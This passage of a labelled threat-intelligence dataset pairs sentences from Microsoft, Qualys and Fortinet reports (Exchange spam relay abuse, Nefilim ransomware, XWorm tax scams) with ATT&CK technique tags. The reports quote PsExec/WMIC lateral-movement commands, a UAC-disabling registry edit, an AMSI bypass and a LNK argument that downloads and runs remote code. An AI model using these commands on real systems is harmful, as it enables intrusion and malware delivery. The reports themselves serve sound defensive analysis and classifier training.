            "The activities mentioned gave the threat actor control of a highly privileged application.",
            "It was observed that the threat actor did not always use the application right after it was deployed.",
            "In some cases, it took weeks or months before the application was utilized.",
            "Also, in organizations that didn\u2019t monitor for suspicious applications, the applications were deployed for months and used multiple times by the threat actor. ",
            "Modifying Exchange settings The threat actor used the privileged application to authenticate the Exchange Online PowerShell module and modify the Exchange settings of the compromised server.",
            "There were two modifications which allowed them to perform the next step in the attack chain: Create a new inbound connector Connectors are a collection of instructions that customize the way email flows to and from organizations using Microsoft 365 or Office 365.",
            "Most organizations using Microsoft 365 and Office 365 don\u2019t need custom connectors for regular mail flow, but some use it when they need to process messages from another messaging system that\u2019s not running Exchange, or if they have a network appliance that performs policy checks and then routes messages to their Exchange server. ",
            "The threat actor set a new inbound connector with the naming convention Ran_([a-zA-Z]){5} (for example Ran_xAFzd).",
            "The purpose of the inbound connector was to allow mails from certain IPs (that are related to the attacker\u2019s infrastructure) to flow through the victim\u2019s Exchange server.",
            "This allowed the threat actor to send emails that looked like they originated from the compromised Exchange domain.",
            "The configuration information for the newly created connectors were seen in Exchange audit event New-InboundConnector.",
            "The following table shows the configuration parameters in the audit event related to this change: NameValue\u201cName\u201d\u201cRan_jBelh\u201d\u201cEnabled\u201d\u201cTrue\u201d\u201cCloudServicesMailEnabled\u201d\u201cTrue\u201d\u201cRestrictDomainsToCertificate\u201d\u201cFalse\u201d\u201cSenderDomains\u201d\u201csmtp:*;1\u201d\u201cSenderIPAddresses\u201d\u201c170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131\u201d\u201cRestrictDomainsToIPAddresses\u201d\u201cTrue\u201d\u201cConnectorSource\u201d\u201cHybridWizard\u201d\u201cEFSkipIPs\u201d\u201c170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131\u201d\u201cTreatMessagesAsInternal\u201d\u201cFalse\u201d\u201cConnectorType\u201d\u201cOnPremises\u201d\u201cRequireTls\u201d\u201cFalse\u201dCreate transport rules Transport rules (also known as mail flow rules) are sets of actions that can be taken on any mail that flows in the organization.",
            "The threat actor utilized this feature to set 12 new transport rules with the naming convention of Test01 to Test012.",
            "Each of these transport rules were responsible for deleting the following specific headers from every mail that flowed in the organization: X-MS-Exchange-ExternalOriginalInternetSenderX-MS-Exchange-SkipListedInternetSenderReceived-SPFReceivedARC-Authentication-ResultsARC-Message-SignatureDKIM-SignatureARC-SealX-MS-Exchange-SenderADCheckX-MS-Exchange-Authentication-ResultsAuthentication-ResultsX-MS-Exchange-AntiSpam-MessageData-ChunkCountBy deleting these headers, the attacker tried defense evasion to prevent security products or email providers detecting or blocking their emails and increase the success rate of the spam campaign.",
            "The configuration information for the newly created transport rules were seen in Exchange audit event New-TransportRule.",
            "The following table shows the configuration parameters in the audit event related to this change: NameValue\u201cName\u201d\u201cTest06\u201d\u201cSenderAddressLocation\u201d\u201cHeader\u201d\u201cRemoveHeader\u201d\u201cARC-Message-Signature\u201dThese modifications to the Exchange server settings allowed the threat actor to perform their primary goal in the attack: sending out spam emails.",
            "After each spam campaign, the actor deleted the malicious inbound connector and transport rules to prevent detection, while the application remained deployed in the tenant until the next wave of the attack (in some cases, the app was dormant for months before it was reused by the threat actor). ",
            "Figure 2.",
            "An example of the PowerShell script used for setting new Exchange connector and transport rulesSpam email campaign sent through Exchange connector The actor behind this attack has been actively running spam email campaigns for many years.",
            "Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure. ",
            "The actor\u2019s motive was to propagate deceptive sweepstakes spam emails designed to trick recipients into providing credit card details and signing up for recurring subscriptions under the guise of winning a valuable prize.",
            "While the scheme possibly led to unwanted charges for targets, there was no evidence of overt security threats such as credential phishing or malware distribution. ",
            "The spam campaign carried the hallmarks of this actor: programmatically generated messages containing two visible hyperlinked images in the email body, as well as dynamic and randomized content injected within the HTML body of each mail message to evade spam filters. Figure 3.",
            "An example of spam email sent through the Exchange inbound connectorThe hyperlinked images within the spam messages implied to recipients that they were eligible for a prize.",
            "Once clicked, the hyperlink directed recipients to a website where they were asked to complete a survey and provide credit card details to pay for the shipping of their prize. ",
            "Familiar brand logos, names, and websites were used throughout the spam email, likely to give an illusion of legitimacy. ",
            "Figure 4.",
            "Clicking the image in the spam email leads to this website indicating a prize has been wonThe fine print, visible only by scrolling to the very bottom of a subsequent page, revealed that in providing their credit card information, recipients were not paying a shipping fee for their prize, but were in fact agreeing to be charged fees for several paid subscription services in order to enter into a sweepstakes for the prize.",
            "It is likely the threat actor\u2019s main motive was potential financial gain from people who fell victim to this deceptive sweepstakes spam campaign. ",
            "Figure 5.",
            "The fine print shows the chance to win a prize is only through a sweepstakes after paying feesLikely to achieve scale and further maximize the chances of successful email delivery, the actor triggered this spam campaign from cloud-based outbound email infrastructure outside of Microsoft, mainly Amazon SES and Mail Chimp.",
            "These email platforms enable sending of mass bulk email, normally for marketing and other legitimate purposes. ",
            "The campaign also utilized techniques to generate unique dynamic URLs underpinning the hyperlinked images within each spam email message, as shown in the examples below. ",
            "Figure 6.",
            "Examples of dynamic URL generation (domain obfuscated)This spam campaign exclusively targeted consumer email accounts.",
            "In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers\u2019 junk folders before they could be viewed and clicked. ",
            "Mitigations While the follow-on spam campaign targets consumer email accounts, this attack targets enterprise tenants to use as infrastructure for this campaign.",
            "This attack thus exposes security weaknesses that could be used by other threat actors in attacks that could directly impact affected enterprises. ",
            "As the main initial access vector of the attack was to obtain the admin\u2019s credentials, we recommend organizations take the following steps to reduce their attack surface: Mitigate credential guessing attacks risks A key step in reducing the attack surface is securing the identity infrastructure.",
            "The most common initial access vector observed in this attack was account compromise through credential stuffing, and all the compromised administrator accounts did not have MFA enabled.",
            "Implementing security practices that strengthen account credentials such as enabling MFA raises the cost of an attack. ",
            "Enable conditional access policies Conditional access policies are evaluated and enforced every time the user attempts to sign in.",
            "Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements. ",
            "Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. ",
            "Enable security defaults While some of the features mentioned above require paid subscriptions, the security defaults in Azure AD, which is mainly for organizations using the free tier of Azure Active Directory licensing, are sufficient to better protect the organizational identity platform, as they provide preconfigured security settings such as MFA, protection for privileged activities, and others. ",
            "Detections for related techniques Leveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Defender for Office 365, Microsoft Defender for Cloud Apps, Application governance add-on, and Azure Active Directory Identity Protection to detect the techniques covered in the attack through the attack chain.",
            "Each product can provide a different aspect for protection to cover the techniques observed in this attack: Microsoft 365 Defender Suspicious email-sending pattern from new Exchange inbound connector \u2013 This alert is generated when a suspicious email-sending pattern originating from a new Exchange inbound connector is detected.",
            "This behavior might suggest that an attacker set a malicious inbound connector to allow anonymous relay through the organization\u2019s Exchange server. ",
            "Recommended reading to response for malicious connector incidents: New transport rule removing antispam header \u2013",
            "This alert is generated when a new transport rule to remove antispam header is detected. ",
            "Suspicious inbound connector and transport rule created to remove sender email headers \u2013 This alert is generated when a suspicious inbound connector and transport rule is created to remove headers that identify the true source address of sender.",
            "This might indicate a spam campaign is ongoing from the organization\u2019s mailbox. ",
            "Suspicious Azure AD app creation \u2013 This alert is generated when a user account creates Azure Active Directory OAuth application with suspicious characteristics, as observed in this campaign. ",
            "Azure AD app registration by risky user \u2013 This alert is generated when a user account with high risk score as calculated by AAD Identity Protection is creating a new OAuth application and grants admin consent to it. ",
            "Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects threat activity associated with this spamming campaign through the following email security alerts.",
            "Note, however, that these alerts may also be triggered by unrelated threat activity.",
            "We\u2019re listing them here because we recommend that these alerts be investigated and remediated immediately. ",
            "Email messages from a campaign removed after delivery\u200b. This alert is generated when any messages associated with a campaign are delivered to mailboxes in an organization.",
            "Microsoft removes the infected messages from Exchange Online mailboxes using zero-hour auto purge (ZAP) if this event occurs. ",
            "Microsoft Defender for Cloud Apps Activity from suspicious IP addresses.",
            "This alert is generated when there is activity from an IP address that has been identified as risky by Microsoft Threat Intelligence or by the organization.",
            "These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account. ",
            "Activity from a password-spray associated IP address.",
            "This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed. ",
            "App governance App governance is an add-on to Microsoft Defender for Cloud Apps, which can detect malicious OAuth applications that make sensitive Exchange Administrative activities along with other threat detection alerts.",
            "Activity related to this campaign will trigger the following alert: OAuth app with suspicious metadata has Exchange permission\u200b. This alert is generated when a line of business OAuth app with suspicious metadata has privilege to manage permission over Exchange, which can lead an OAuth App to perform data collection or exfiltration activities or attempts to access and retrieve sensitive information. ",
            "Azure AD Identity Protection Azure AD Identity Protection automatically detects and remediates identity-based risks.",
            "It detects suspicious sign-in attempts and raises any of the following alerts: Anomalous Token. ",
            "This alert flags a token\u2019s unusual characteristics, such as its token lifetime or played from an unfamiliar location.",
            "Unfamiliar sign-in properties. ",
            "In this phishing campaign, the attackers used multiple proxies or VPNs originating from various countries or regions unfamiliar to the target user.",
            "This alert flags anomalies in the token claims, token age, and other authentication attributes.",
            "Anonymous IP address. ",
            "This alert flag sign-in attempts from anonymous IP addresses (for example, Tor browser or anonymous VPN).Hunting queries To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries: Applications given the \u201cExchange.ManageAsApp\u201d permission: CloudAppEvents | where Timestamp > ago(30d) | where ActionType == \"Add app role assignment to service principal.",
            "\" | where RawEventData.",
            "ResultStatus == \"Success\" | where RawEventData has \"dc50a0fb-09a3-484d-be87-e023b12c6440\" //Exchange.ManageAsApp",
            "Role Id | project Timestamp, AccountObjectId,AccountDisplayName, AppId = RawEventData.ModifiedProperties[0].NewValue, AppName = RawEventData.",
            "ModifiedProperties[6].NewValue New transport rules that remove anti-spam headers from emails: CloudAppEvents | where ActionType == \"New-TransportRule\" | mvexpand Param = RawEventData.",
            "Parameters | where Param.",
            "Name == \"RemoveHeader\" and Param.",
            "Value contains \"X-MS-Exchange-AntiSpam-MessageData\" | project Timestamp, AccountObjectId, AccountDisplayName, ServicePrincipalId = tostring(RawEventData.",
            "AppId) "
        ],
        "label": [
            [],
            [
                "T1110"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1110"
            ],
            [
                "T1110"
            ],
            [
                "T1110"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Nefilim Ransomware",
        "cti_report": [
            "title: Nefilim Ransomware url: https://blog.qualys.com/vulnerabilities-threat-research/2021/05/12/nefilim-ransomware Over the past year there has been a rise in extortion malware that focuses on stealing sensitive data and threatening to publish the data unless a ransom is paid.",
            "This technique bypasses some of the mitigations put in place, such as backups, which would allow IT organizations to recover data without having to pay such a ransom.",
            "One of the more popular ransomware families over the last few months to switch to this extortion tactic was Nefilim. ",
            "About Nefilim Ransomware Nefilim ransomware emerged in March 2020 when Nemty operators quit the ransomware as a service model to concentrate their energy on more targeted attacks with more focused resources.",
            "The author of the Nemty ransomware also appears to have shared Nemty\u2019s source code with others.",
            "According to Vitali Kremez and ID Ransomware\u2019s Michael Gillespie, the new Nefilim ransomware appears to be based on Nemty\u2019s code.",
            "Sharing many notable similarities with Nemty version 2.5, Nefilim has the capabilities to move laterally within networks. ",
            "Nefilim targets vulnerabilities such as CVE-2019-11634 and CVE-2019-19781 in Citrix gateway devices, identified in December 2019 and patched in January 2020.",
            "The hackers target organizations using the unpatched or poorly secured Citrix remote-access technology, stealing data and then deploying ransomware. ",
            "Nefilim attackers exfiltrate sensitive data before encryption.",
            "When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.",
            "Nefilim places a heavy emphasis on Remote Desktop Protocols. ",
            "Once an attacker gains a foothold on the victim system, the attacker drops and executes its components such as anti-antivirus, exfiltration tools, and finally Nefilim itself. ",
            "Lateral Movement Among the various tactics and techniques used by the attackers, they rely on tools such as PsExec to remotely execute commands in their victims\u2019 networks.",
            "It has been also seen that Nefilim uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft\u2019s NetPass.",
            "It uses bat files to stop services/kill processes as shown in below image, and the stolen credentials are used to reach high-value machines like servers.",
            "The hackers work to move around the network before deploying their ransomware to find out where juicier data may be stored.",
            "They exfiltrate sensitive data before encryption. ",
            "Some of the commands that execute by the attacker Start copy kill.bat \\destinationip\\c$\\windows\\temp Start psexec.exe \\destinationip -u domain\\username\\ -p password -d",
            "-h -r mstdc -s -accepteula -nobanner c:\\windows\\teamp\\Kill.bat Start psexec.exe -accepteula \\destinationip -u domain\\username\\ -p password reg add HKLM\\software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v",
            "EnableLUA /t REG_DWORD /d",
            "0 /F WMIC /node: \\destinationip /username:\u201ddomain\\username\u201d /password:\u201dpassword\u201d process CALL CREATE \u201ccmd.exe /c",
            "copy \\sourceip\\c$\\windows\\temp C:\\WINDOWS\\TEMP\\kill.bat\" WMIC /node: \\destinationip /username:\u201ddomain\\username\u201d",
            "/password:\u201dpassword\u201d process CALL CREATE \u201ccmd.exe /c C:\\WINDOWS\\TEMP\\kill.bat\" Below images shows A batch file to stop services/kill processes Fig.",
            "1 Stopping Services Fig.",
            "2 Killing Process Data exfiltration It copies data from servers/shared directories to the local directory and compresses with dropped 7zip binary.",
            "It also drops and installs MegaSync to exfiltrate data. ",
            "Ransomware Execution The Nefilim malware uses AES-128 encryption to lock files and their blackmail payments are made via email.",
            "After encryption, it dropped the ransomware note by named \u2018NEFILIM-DECRYPT.txt\u2019.",
            "All files are encrypted with the extension of (.NEFILIM).",
            "It appends AES encrypted key at end of the encrypted file.",
            "This AES encryption key will then be encrypted by an RSA-2048 public key that is embedded in the ransomware executable.",
            "In addition to the encrypted AES key, the ransomware will also add the \u201cNEFILIM\u201d string as a file marker to all encrypted files. Fig.",
            "3 Crypto API\u2019s in Nefilim IOC In the Below image malware create Mutex Fig.",
            "4 Creating Mutex Some of the Anti-debugging techniques: Ransomware uses anti-debugging method by calling the IsDebuggerPresent function.",
            "This function detects if the calling process is being debugged by a user-mode debugger.",
            "It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.",
            "It checks for a timestamp and compare it to another one after a few malicious instructions, in order to check if there was a delay. ",
            "Fig.",
            "5",
            "Anti debugging API Fig.",
            "6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API \"C:\\Windows\\System32\\cmd.exe\" /c",
            "timeout /t",
            "3 /nobreak && del \"C:\\Users\\admin\\Download{ransomware_filename}.exe\" /s /f /q Fig. 7 Self Deletion High-Profile Attacks Taking a Toll Nefilim\u2019s highest-profile ransomware attack to date was against the Australian shipping organization, Toll Group.",
            "The attack was first published on May 5, 2020.",
            "Two months previously, Toll Group was a victim of a Netwalker ransomware attack.",
            "In both cases, Toll Group refused to pay the ransom.",
            "In response, Nefilim leaked sensitive Toll Group data and popularized that Toll Group had failed to employ full cybersecurity protocols even after the Netwalker attack, potentially making the organization vulnerable to more attacks.",
            "This demonstrates how Nefilim will keep the pressure on its victims to pay ransoms. ",
            "Mitigation or Additional Important Safety Measures Network Keep strong and unique passwords for login accounts.",
            "Disable RDP if not used.",
            "If required change RDP port to a non-standard port.",
            "Configure firewall in following way,Deny access to Public IPs to important ports (in this case RDP port 3389)Allow access to only IP\u2019s which are under your control.",
            "Use VPN to access the network, instead of exposing RDP to the Internet.",
            "Possibility implement Two Factor Authentication (2FA).Set lockout policy which hinders credentials guessing.",
            "Create a separate network folder for each user when managing access to shared network folders. ",
            "Take regular data backup Protect systems from ransomware by periodically backing up important files regularly and keep a recent backup copy offline.",
            "Encrypt your backup.",
            "If your computer gets infected with ransomware, your files can be restored from the offline backup once the malware has been removed.",
            "Always use a combination of online and offline backup.",
            "Do not keep offline backups connected to your system as this data could be encrypted when ransomware strike. ",
            "Keep software updated Always keep your security software (antivirus, firewall, etc.)",
            "up to date to protect your computer from new variants of malware.",
            "Regularly patch and update applications, software, and operating systems to address any exploitable software vulnerabilities.",
            "Do not download cracked/pirated software as they risk backdoor entry for malware into your computer.",
            "Avoid downloading software from untrusted P2P or torrent sites.",
            "In most cases, they are malicious software. ",
            "Having minimum required privileges Don\u2019t assign Administrator privileges to users.",
            "Most importantly, do not stay logged in as an administrator unless it is strictly necessary.",
            "Also, avoid browsing, opening documents, or other regular work activities while logged in as an administrator. ",
            "Monitor for Lateral Movement To spot these attacks, keep an eye out not only for attack code but also monitor for any evidence of lateral movement and data exfiltration within the environment.",
            "To determine if an organization has been hit by Nefilim, check remote-access systems for any signs of unauthorized access.",
            "To identify potential data exfiltration, additionally identify unusual host outbound traffic patterns. ",
            "Nefilim TTP Map Initial AccessExecutionDefense EvasionCredential AccessDiscoveryLateral MovementExfiltrationImpactExploit",
            "Public-Facing Application (T1190)Native API (T1106)File Deletion (T1070.004)OS Credential Dumping (T1003)Software Discovery: Security Software Discovery (T1518.001)Lateral Tool Transfer (T1570)Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)Data Encrypted for impact (T1486)Impair Defenses: Disable or Modify Tools (T1562:001)Remote System Discovery (T1018)Inhibit system Recovery (T1490)System Information Discovery (T1082)File and Directory Discovery (T1083) Indicators of Compromise (IOCs) SHA256 8be1c54a1a4d07c84b7454e789a26f04a30ca09933b41475423167e232abea2bb8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2e3080b45bab3f804a297ec6d8f407ae762782fa092164f8ed4e106b1ee7e249537de8ca88e240fb905fc2e8fd5db6c5af82d8e21556f0ae36d055f623128c3377b227fa0485e34511627a8a4a7d3f1abb6231517be62d022916273b7a51b80a173bac058dbea51f52ce154fed0325fd835f35c1cd521462ce048b41c9b099e1e5353ee5805bc5c7a98fb5d522b15743055484dc47144535628d102a4098532cd55ab834f599c6ad35fcd0a168d93c52c399c6de7d1c20f33e25cb1fdb25aec9c652e25bdd600695cfed0d4ee3aca4f121bfebf0de889593e6ba06282845cf39ea35a0bced28fd345f3ebfb37b6f9a20cc3ab36ab168e079498f3adb25b41e156f7a73032ece59af3316c4a64490344ee111e4cb06aaf00b4a96c10adfdd65559908c7dfde13ade4b13350ae290616d7c2f4a87cbeac9a3886e90a175ee40fb641D4492a9eb36f87a9b3156b59052ebaf10e264d5d1ce4c015a6b0d205614e58e3B8066b7ec376bc5928d78693d236dbf47414571df05f818a43fb5f52136e8f2efcc2921020690a58c60eba35df885e575669e9803212f7791d7e1956f9bf8020 References https://www.zdnet.com/article/nemty-ransomware-operation-shuts-down/https://www.bleepingcomputer.com/news/security/new-nefilim-ransomware-threatens-to-release-victims-data/https://www.bleepingcomputer.com/news/security/nemty-ransomware-punishes-victims-by-posting-their-stolen-data/https://www.trendmicro.com/vinfo/au/security/news/cybercrime-and-digital-threats/updated-analysis-on-nefilim-ransomware-s-behaviorhttps://www.bankinfosecurity.com/blogs/toll-group-data-leaked-following-second-ransomware-incident-p-2902https://www.tollgroup.com/toll-it-systems-updateshttps://www.picussecurity.com/resource/blog/how-to-beat-nefilim-ransomware-attacks "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1190",
                "T1021.001",
                "T1110"
            ],
            [
                "T1021.001"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [
                "T1059.003",
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1112"
            ],
            [],
            [
                "T1047"
            ],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [
                "T1027",
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Deja Vu All Over Again Tax Scammers at Large",
        "cti_report": [
            "title: Deja Vu All Over Again: Tax Scammers at Large url: https://www.fortinet.com/blog/threat-research/tax-scammers-at-large Affected Platforms: WindowsImpacted Users: Windows usersImpact: Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:",
            "Medium The time has come again for tax returns\u2014and tax-based scams.",
            "Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. ",
            "This blog covers a few examples of malware that take advantage of tax season.",
            "Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. ",
            "XWorm Delivered Through Tax Scam FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed. ",
            "Figure 1.",
            "Empty open directory that hosted 2022%20tax_documents[.]zip ",
            "The zip file contains the following files: Annual Withdrawal.xlsx (SHA2: 59bb292565ebc86800e5e4d625d3c19f98afe2261d3da1a8e2f9b45ec76153a0) Robert tax_docs.pdf (SHA2: a9f4b054ea128529c62a8ff25f1439651f045e443adf5ff11fb5bd29f1333a7a) Figure 2.",
            "Contents of the 2022%20tax_documents[.]zip The XLSX file is a benign decoy file that contains financial data from an unknown source. ",
            "Figure 3.",
            "Contents of the Annual Withdrawal.xlsx The other file is malicious.",
            "Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems.",
            "The file is actually a link (LNK) file that launches the legitimate script (C:\\Windows\\System32\\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments.",
            "The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote \u201cnote.hta\u201d: ;\\W_\\*2\\\\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.",
            "'+'hta') ",
            "The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.",
            "Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. ",
            "note.gif is a PowerShell script that creates the following files: C:\\Users\\Public\\onedrive.vbs (SHA2: 92C1767EE4A954B93D6AFA9AE83FE82B82D2867D919D0359DCF2C8DA75FB8C7C) ",
            "C:\\Users\\Public\\test.vbs (SHA2: ADBA59F1495965684EEB4C5DAAD67F732FEB5E9183AE05EB869E20C88CAD7327) C:\\Users\\Public\\onedrive.ps1 (SHA2: 7A9705A424A634A321DB9F36B61D74B953A44D44EDC429F7641BF830870572FC) Once launched, it executes the onedrive.vbs and test.vbs files. ",
            "test.vbs creates %usertemp%\\Note.txt, a clean file containing fake \"QUARTERLY TAX PAYMENTS FOR 2022\" data. Figure 4.",
            "Note.txt containing fake \u201cQUARTERLY TAX PAYMENTS FOR 2022\u201d data onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender.",
            "It first executes the following known AMSI (Antimalware Scripting Interface) bypass: ",
            "[Ref].Assembly.GetType(\u2018System.",
            "Management.",
            "Automation.",
            "AmsiUtils\u2019) ",
            ".GetField(\u2018amsiInitFailed\u2019,\u2019NonPublic,Static\u2019).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\".",
            "The PowerShell script then performs the following actions to alter Windows Defender settings: Adds the following exclusions to Windows DefenderExtensions: .bat, .ppam, .xls, .docx, .bat, .exe, .vbs, .js ",
            "File paths: C:\\, D:\\, E:\\ Processes: explorer.exe, kernel32.dll, aspnet_compiler.exe, cvtres.exe, CasPol.exe, csc.exe, Msbuild.exe, ilasm.exe, InstallUtil.exe, jsc.exe, Calc.exe, powershell.exe, rundll32.exe, conhost.exe, Cscript.exe, mshta.exe, cmd.exe, DefenderisasuckingAntivirus, wscript.exe Allows known Windows Defender Threat IDs to execute Disables Windows Defender Attack Surface Reduction (ASR) rules Disables the following Windows Defender features:Intrusion Prevention System IO AV Protection (does not scan downloaded files and attachments) ",
            "Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log) ",
            "Disables MAPS (Microsoft Active Protection Service) reporting Never submits samples to Microsoft Allows severe/high/moderate/low-level threats to execute Disables the \"administrator in Admin Approval Mode\" user type (disables UAC prompts) Stops the WinDefend service (Windows Defender) Disables the startup of the WinDefend service Deletes the WinDefend service Creates a user named \"System32\" with the password \u201c123\u201d (no quotes) Adds the System32 user to both the \"administrators\" group and the \"Remote Desktop Users\" group Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc) Turns off Windows Firewall The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. ",
            "Furthermore, we discovered other files that follow a similar attack pattern; \u201cMary tax docs.pdf.lnk\u201d (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and \u201cWilson tax_docs.pdf.lnk\u201d (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023.",
            "As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. ",
            "\u201cMary tax docs.pdf.lnk\u201d, along with another clean Microsoft Office file, \u201cR&P Sales Summary.docx\u201d, are included in an archived file labeled \u201c2022 tax docs.zip\u201d.",
            "Running the link file triggers the download and execution of \u201cdoc.pdf\u201d from \u201chxxp://datacenter11[.]myftp[.]org/notepad/\u201d.",
            "The \u201cdoc.pdf\u201d is actually a VBA file that uses PowerShell to pull and run \u201chxxp://datacenter11[.]myftp[.]org/met/a[.]mp3\u201d.",
            "While the \u201ca.mp3\u201d is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim\u2019s machine. ",
            "XWorm From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. ",
            "XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150.",
            "XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC).",
            "XWorm can also encrypt files, essentially acting in a similar fashion to ransomware.",
            "Here are screenshots of a recently cracked version of XWorm v3.1: Figure 5.",
            "Leaked cracked version of XWorm v3.1 Figure 6.",
            "Some of the functionalities supported by XWorm v3.1 Figure 7.",
            "Download page of the cracked version of XWorm v.3.1 Going back to the first example, \u201c2022%20tax_documents[.]zip\u201d, we found that it was hosted on the open directory \u201cwww[.]farmaciasmv[.]com/citrix/\u201d.",
            "We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html.",
            "The files involved in this attack were submitted to VirusTotal.",
            "We don\u2019t believe victims just wander into such malicious sites by accident.",
            "Based on our experience, they were likely lured via malicious links in spam emails. ",
            "Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.",
            "The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. ",
            "Dual Malware Wielding Another tax-related attack FortiGuard Labs came across is an image file named \u201cTaxReturn2022.img\u201d (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: ",
            "TaxReturn2022.pdf.lnk (SHA2: 180a79cff5ef91ecd744a35b2e433d0a4aae0e4d3b87c40e8e51f5ca02aac4d6) TaxReturns2022.pdf.lnk (SHA2: fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55) TaxReturns2022.zip (SHA2: c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf) ",
            "We were able to locate another file, \u201cTaxReturns2022.iso\u201d (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files. ",
            "Figure 8.",
            "Contents of TaxReturn2022.img Figure 9.",
            "Contents of TaxReturns2022.iso Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. ",
            "The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted. ",
            "As with the previous example, \u201cTaxReturn2022.pdf.lnk\u201d has a PDF icon.",
            "However, it\u2019s a link (shortcut) file, as seen in Figure 4. ",
